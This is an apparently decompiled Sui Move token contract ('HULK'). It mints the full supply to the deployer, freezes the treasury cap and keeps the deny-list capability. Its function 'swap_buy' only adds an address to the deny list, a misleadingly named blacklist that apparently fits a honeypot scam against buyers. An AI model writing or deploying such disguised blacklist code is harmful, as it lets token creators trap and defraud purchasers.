module 0xcb816abfad011c4153f0ca92d14e1bf53e38973c5bfe4aa9bcfc735ba7848c84::hulk {
    struct HULK has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: HULK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<HULK>(arg0, 9, b"HULK", b"HULK", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZo214psHUoGBYVGiaNtDTFZdwB6ZPFShxDd21jCEMSW2"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<HULK>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<HULK>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<HULK>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<HULK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<HULK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<HULK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

